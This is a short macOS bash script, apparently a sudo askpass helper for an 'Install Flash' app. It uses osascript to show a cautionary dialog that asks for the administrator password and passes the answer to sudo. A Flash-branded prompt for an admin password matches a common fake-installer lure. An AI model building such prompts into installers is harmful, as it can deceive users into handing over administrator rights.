#!/bin/bash
# sudo's askpass for Install Flash.app: the password in macOS's own dialog, never a terminal.
/usr/bin/osascript -e 'text returned of (display dialog "Flash needs an administrator password to install a part of itself." default answer "" with hidden answer with title "Install Flash" with icon caution buttons {"Cancel", "OK"} default button "OK")' 2>/dev/null
